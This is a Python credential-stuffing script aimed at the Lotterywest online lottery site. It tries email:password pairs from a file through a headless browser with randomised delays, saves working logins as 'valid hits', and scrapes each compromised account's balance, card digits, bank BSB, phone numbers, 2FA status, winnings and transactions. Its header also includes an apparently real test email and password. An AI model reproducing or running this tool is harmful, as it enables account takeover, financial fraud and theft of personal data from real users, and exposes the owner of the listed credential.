#!/usr/bin/env python3
"""
Lotterywest Account Checker
Extracts: Profile, Payment Methods, Phone, 2FA, Tickets, Balance, Spend Limit, Bank Accounts, Deposits, Wins, Spend
URL: https://play.lotterywest.wa.gov.au/
Test: gemkelleher@gmail.com:Leonardo12
"""

import os
import re
import json
import time
import random
from datetime import datetime

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.common.exceptions import TimeoutException, NoSuchElementException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("Selenium not available")

# === CONFIG ===
LOTTERYWEST_URL = "https://play.lotterywest.wa.gov.au/"
OUTPUT_DIR = "./lotterywest_results"
HEADLESS = True

SELECTORS = {
    "email": ['input[type="email"]', 'input[name="email"]', '#email'],
    "password": ['input[type="password"]', 'input[name="password"]', '#password'],
    "submit": ['button[type="submit"]', 'button:contains("Continue")', 'button:contains("Log In")'],
}

class LotterywestChecker:
    def __init__(self, headless=True):
        self.driver = None
        self.headless = headless
        self.email = None
        
    def setup_driver(self):
        if not SELENIUM_AVAILABLE:
            return False
        opts = Options()
        if self.headless:
            opts.add_argument("--headless")
        opts.add_argument("--no-sandbox")
        opts.add_argument("--disable-dev-shm-usage")
        opts.add_argument("--window-size=1280,720")
        
        try:
            self.driver = webdriver.Chrome(options=opts)
            self.driver.set_page_load_timeout(30)
            return True
        except Exception as e:
            print(f"Driver error: {e}")
            return False
    
    def find_element(self, selectors, timeout=10):
        if not self.driver:
            return None
        for selector in selectors:
            try:
                if selector.startswith("//"):
                    el = WebDriverWait(self.driver, timeout).until(
                        EC.presence_of_element_located((By.XPATH, selector))
                    )
                else:
                    el = WebDriverWait(self.driver, timeout).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                return el
            except:
                continue
        return None
    
    def login(self, email, password, max_retries=3):
        self.email = email
        
        if not self.setup_driver():
            return {"status": "NO_DRIVER", "email": email}
        
        for attempt in range(max_retries):
            try:
                self.driver.get(LOTTERYWEST_URL)
                time.sleep(random.uniform(2, 4))
                
                # Enter email
                email_el = self.find_element(SELECTORS["email"])
                if not email_el:
                    continue
                email_el.clear()
                email_el.send_keys(email)
                
                # Enter password
                pass_el = self.find_element(SELECTORS["password"])
                if not pass_el:
                    continue
                pass_el.clear()
                pass_el.send_keys(password)
                
                # Click login
                time.sleep(0.5)
                submit_el = self.find_element(SELECTORS["submit"])
                if submit_el:
                    submit_el.click()
                
                time.sleep(3)
                
                # Check success
                if self.is_logged_in():
                    return {"status": "VALID", "email": email}
                
                # Check for error messages
                error = self.find_element(['.error', '[class*="error"]', '.message'])
                if error and error.text:
                    return {"status": "INVALID", "email": email, "error": error.text}
                    
            except Exception as e:
                print(f"Attempt {attempt+1} error: {e}")
                time.sleep(2)
        
        return {"status": "FAILED", "email": email}
    
    def is_logged_in(self):
        if not self.driver:
            return False
        return "account" in self.driver.current_url or "Hi," in self.driver.page_source
    
    def extract_profile(self):
        """Extract all profile data"""
        data = {
            "profile": {},
            "balance": {},
            "tickets": [],
            "transactions": [],
            "payment_methods": {},
            "bank_accounts": [],
            "totals": {},
            "2fa": False
        }
        
        if not self.driver:
            return data
        
        try:
            # Go to account page
            self.driver.get("https://play.lotterywest.wa.gov.au/account")
            time.sleep(2)
            
            html = self.driver.page_source
            
            # Extract name
            name_match = re.search(r'Hi,\s*(\w+)', html)
            if name_match:
                data["profile"]["name"] = name_match.group(1)
            
            # Extract email
            if self.email:
                data["profile"]["email"] = self.email
            
            # Extract balance
            balance_patterns = [
                r'Balance:\s*\$?([\d,]+\.?\d*)',
                r'\$\s*([\d,]+\.?\d*)[\s<](?:Balance)',
            ]
            for p in balance_patterns:
                m = re.search(p, html, re.IGNORECASE)
                if m:
                    data["balance"]["available"] = m.group(1)
                    break
            
            # Extract spend limit (general)
            spend_match = re.search(r'Spend\s*Limit:\s*\$?([\d,]+\.?\d*)', html, re.IGNORECASE)
            if spend_match:
                data["balance"]["spend_limit"] = spend_match.group(1)
            
            # LOOK FOR NEW FIELDS - Navigate to wallet tab
            try:
                # Try to find and click wallet link
                wallet_links = self.find_element(['a[href*="wallet"]', 'a[href*="/wallet"]', 'button:contains("Wallet")', 'nav a:contains("Wallet")'])
                if wallet_links:
                    wallet_links.click()
                else:
                    # Try direct URL
                    self.driver.get("https://play.lotterywest.wa.gov.au/wallet")
                time.sleep(2)
                wallet_html = self.driver.page_source
                
                # Debug - save wallet page for inspection
                try:
                    with open("/tmp/wallet_debug.html", "w") as f:
                        f.write(wallet_html)
                    print("Saved wallet page to /tmp/wallet_debug.html")
                except:
                    pass
                
                # Current Balance - MORE AGGRESSIVE PATTERN - look for large dollar amounts
                balance_patterns = [
                    r'(?i)Current\s*Balance[^$]*\$([\d,]+\.?\d*)',
                    r'(?i)Balance[^:]*:\s*\$?([\d,]+\.?\d*)',
                    r'(?i)\$([\d,]+\.\d{2})(?:\s|$)',
                    r'\$\s*([\d]{1,3}(?:,\d{3})*\.\d{2})',
                ]
                for p in balance_patterns:
                    m = re.search(p, wallet_html)
                    if m:
                        amt = m.group(1)
                        # Filter out small amounts like .95 or spend limits
                        if float(amt.replace(",","")) >= 0:
                            data["balance"]["current"] = amt
                            print(f"Found balance: ${amt}")
                            break
                
                # Weekly online spend limit
                weekly_match = re.search(r'(?i)Weekly\s*(?:online\s*)?spend\s*limit[:\s]*\$?([\d,]+\.?\d*)', wallet_html)
                if weekly_match:
                    data["balance"]["weekly_spend_limit"] = weekly_match.group(1)
                
                # Total spending (last 12 months)
                spend_patterns = [
                    r'(?i)Total\s*spending[^$]*\$([\d,]+\.?\d*)',
                    r'(?i)Spending.*?12.*?\$([\d,]+\.?\d*)',
                ]
                for p in spend_patterns:
                    m = re.search(p, wallet_html)
                    if m:
                        data["totals"]["total_spending"] = m.group(1)
                        break
                
                # Total winnings (last 12 months)  
                win_patterns = [
                    r'(?i)Total\s*winnings[^$]*\$([\d,]+\.?\d*)',
                    r'(?i)Winnings.*?12.*?\$([\d,]+\.?\d*)',
                ]
                for p in win_patterns:
                    m = re.search(p, wallet_html)
                    if m:
                        data["totals"]["total_winnings"] = m.group(1)
                        break
                
                # Last deposit
                deposit_match = re.search(r'(?i)Last\s*deposit.*?\$([\d,]+\.?\d*)', wallet_html)
                if deposit_match:
                    data["totals"]["last_deposit"] = deposit_match.group(1)
                
                # Deposit method
                if "paypal" in wallet_html.lower():
                    data["totals"]["last_deposit_method"] = "PayPal"
                elif "card" in wallet_html.lower():
                    data["totals"]["last_deposit_method"] = "Card"
                
                # Current draws/tickets
                draws_match = re.search(r'(\d+)\s*(?i)current\s*(?:draw|ticket)', wallet_html)
                if draws_match:
                    data["tickets"] = [{"current_draws": draws_match.group(1)}]
                
                # Check for PayPal
                if "paypal" in wallet_html.lower() or "PayPal" in wallet_html:
                    data["payment_methods"]["paypal"] = True
                    
                # Look for payment cards
                visa_match = re.findall(r' Visa [\d\*]+(\d{4})', wallet_html)
                mc_match = re.findall(r' Mastercard [\d\*]+(\d{4})', wallet_html)
                card_nums = visa_match + mc_match
                if card_nums:
                    data["payment_methods"]["cards"] = card_nums
                else:
                    any_card = re.search(r'(\d{4}[\s*]+\d{4})', wallet_html)
                    if any_card:
                        data["payment_methods"]["cards"] = [any_card.group(1)]
                        
            except Exception as e:
                print(f"Wallet tab error: {e}")
            
            # Navigate to Account tab for phone numbers - CRITICAL
            try:
                account_tab = self.find_element(['a[href*="account"]', 'button:contains("Account")', 'nav:contains("Account")'])
                if account_tab:
                    account_tab.click()
                    time.sleep(1.5)
                    account_html = self.driver.page_source
                    
                    # Preferred phone number - CRITICAL
                    pref_phone_match = re.search(r'(?i)Preferred\s*(?:phone\s*)?number[:\s]*(\*+\d{3})', account_html)
                    if pref_phone_match:
                        data["profile"]["preferred_phone"] = pref_phone_match.group(1)
                    else:
                        alt_pref = re.search(r'(?i)(?:Primary|Main)[:\s]*(\+?\d+\*+\d+)', account_html)
                        if alt_pref:
                            data["profile"]["preferred_phone"] = alt_pref.group(1)
                    
                    # Secondary phone number - CRITICAL
                    sec_phone_match = re.search(r'(?i)Secondary\s*(?:phone\s*)?number[:\s]*(\*+\d{3})', account_html)
                    if sec_phone_match:
                        data["profile"]["secondary_phone"] = sec_phone_match.group(1)
                    else:
                        alt_sec = re.search(r'(?i)(?:Backup|Alternative)[:\s]*(\+?\d+\*+\d+)', account_html)
                        if alt_sec:
                            data["profile"]["secondary_phone"] = alt_sec.group(1)
                    
                    # Bank account for withdrawal - CRITICAL
                    bank_match = re.search(r'(?i)(?:withdraw(?:al)?|bank\s*account)[:\s]*.*?(\d{3}).*?(\d{3})', account_html)
                    if bank_match:
                        # Has bank account set
                        data["withdrawal_bank"] = {
                            "bsb": f"{bank_match.group(1)}-{bank_match.group(2)}",
                            "set": True
                        }
                    else:
                        # Check if bank field exists but empty
                        if "bank account" in account_html.lower():
                            data["withdrawal_bank"] = {"set": False}
                            
            except Exception as e:
                print(f"Account tab error: {e}")
            
            # Check 2FA
            if "2FA" in html or "two-factor" in html.lower() or "security" in html.lower():
                data["2fa"] = True
            
            # Look for ticket count
            ticket_match = re.search(r'(\d+)\s*Ticket', html, re.IGNORECASE)
            if ticket_match:
                data["tickets"] = [{"count": ticket_match.group(1)}]
            
            # Look for wins
            win_patterns = [
                r'(?i)total\s+won[:\s]*\$?([\d,]+\.?\d*)',
                r'(?i)winnings[:\s]*\$?([\d,]+\.?\d*)',
            ]
            for p in win_patterns:
                m = re.search(p, html)
                if m:
                    data["totals"]["total_won"] = m.group(1)
                    break
            
            # Look for total deposited
            deposited_patterns = [
                r'(?i)total\s+deposited[:\s]*\$?([\d,]+\.?\d*)',
                r'(?i)deposited[:\s]*\$?([\d,]+\.?\d*)',
            ]
            for p in deposited_patterns:
                m = re.search(p, html)
                if m:
                    data["totals"]["total_deposited"] = m.group(1)
                    break
            
            # Look for bank accounts
            bank_patterns = [r'Bank\s*Account.*?(\*{4}\d{4})']
            for p in bank_patterns:
                matches = re.findall(p, html, re.IGNORECASE)
                if matches:
                    data["bank_accounts"] = matches[:3]
            
            # Extract transactions by date
            trans_pattern = r'(\d{1,2}\s+\w+\s+\d{4})\s+\$?([\d,]+\.?\d*)'
            for match in re.findall(trans_pattern, html)[:10]:
                data["transactions"].append({
                    "date": match[0],
                    "amount": match[1]
                })
            
        except Exception as e:
            print(f"Extraction error: {e}")
        
        return data
    
    def close(self):
        if self.driver:
            self.driver.quit()
            self.driver = None


def load_accounts(filename="accounts.txt"):
    accounts = []
    if os.path.exists(filename):
        with open(filename) as f:
            for line in f:
                line = line.strip()
                if line and ":" in line:
                    email, password = line.split(":", 1)
                    accounts.append({"email": email.strip(), "password": password.strip()})
    return accounts


def save_results(results, output_dir=OUTPUT_DIR):
    os.makedirs(output_dir, exist_ok=True)
    
    # JSON
    json_file = os.path.join(output_dir, "lotterywest_results.json")
    with open(json_file, "w") as f:
        json.dump(results, f, indent=2, default=str)
    
    # Valid hits
    valid_file = os.path.join(output_dir, "valid_hits.txt")
    with open(valid_file, "w") as f:
        for r in results:
            if r.get("status") == "VALID":
                f.write(f"{r['email']}:{r['password']}\n")
    
    # Report
    report_file = os.path.join(output_dir, "report.txt")
    with open(report_file, "w") as f:
        f.write("="*50 + "\n")
        f.write("LOTTERYWEST ACCOUNT CHECK REPORT\n")
        f.write(f"Generated: {datetime.now()}\n")
        f.write("="*50 + "\n\n")
        
        for r in results:
            f.write(f"Account: {r.get('email')}\n")
            f.write(f"Status: {r.get('status')}\n")
            
            if r.get("data"):
                data = r["data"]
                
                if data.get("profile"):
                    f.write(f"Name: {data['profile'].get('name', 'N/A')}\n")
                    f.write(f"Email: {data['profile'].get('email', 'N/A')}\n")
                    f.write(f"Phone: {data['profile'].get('phone', 'N/A')}\n")
                
                if data.get("balance"):
                    f.write(f"Balance: {data['balance'].get('available', 'N/A')}\n")
                    f.write(f"Spend Limit: {data['balance'].get('spend_limit', 'N/A')}\n")
                
                if data.get("2fa"):
                    f.write(f"2FA: {data['2fa']}\n")
                
                if data.get("totals"):
                    f.write(f"Total Won: {data['totals'].get('total_won', 'N/A')}\n")
                    f.write(f"Total Deposited: {data['totals'].get('total_deposited', 'N/A')}\n")
                
                if data.get("transactions"):
                    f.write(f"Transactions ({len(data['transactions'])}):\n")
                    for t in data["transactions"]:
                        f.write(f"  {t['date']}: ${t['amount']}\n")
                
                if data.get("payment_methods"):
                    f.write(f"Payment Cards: {data['payment_methods']}\n")
                
                if data.get("bank_accounts"):
                    f.write(f"Bank Accounts: {data['bank_accounts']}\n")
            
            f.write("-"*30 + "\n\n")
    
    print(f"Results saved to {output_dir}/")
    return json_file


def check_account(email, password):
    checker = LotterywestChecker(headless=HEADLESS)
    
    result = checker.login(email, password)
    
    if result.get("status") == "VALID":
        result["data"] = checker.extract_profile()
    
    checker.close()
    return result


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="Lotterywest Account Checker")
    parser.add_argument("--accounts", default="accounts.txt", help="Account file")
    parser.add_argument("--headless", action="store_true", default=True)
    parser.add_argument("--visible", action="store_true", help="Show browser")
    args = parser.parse_args()
    
    global HEADLESS
    HEADLESS = not args.visible
    
    accounts = load_accounts(args.accounts)
    if not accounts:
        print(f"No accounts in {args.accounts}")
        print("Format: email:password")
        return
    
    print(f"Checking {len(accounts)} accounts...")
    
    results = []
    for i, acc in enumerate(accounts):
        email = acc["email"]
        password = acc["password"]
        print(f"\n[{i+1}/{len(accounts)}] Checking: {email}")
        
        result = check_account(email, password)
        print(f"  Status: {result.get('status', 'UNKNOWN')}")
        
        if result.get("status") == "VALID" and result.get("data"):
            profile = result["data"].get("profile", {})
            balance = result["data"].get("balance", {})
            print(f"  Name: {profile.get('name', 'N/A')}")
            print(f"  Balance: {balance.get('available', 'N/A')}")
            print(f"  Spend Limit: {balance.get('spend_limit', 'N/A')}")
        
        results.append({**acc, **result})
        
        if i < len(accounts) - 1:
            time.sleep(random.uniform(2, 5))
    
    save_results(results)
    
    valid_count = sum(1 for r in results if r.get("status") == "VALID")
    print(f"\n{valid_count}/{len(accounts)} accounts VALID")


if __name__ == "__main__":
    main()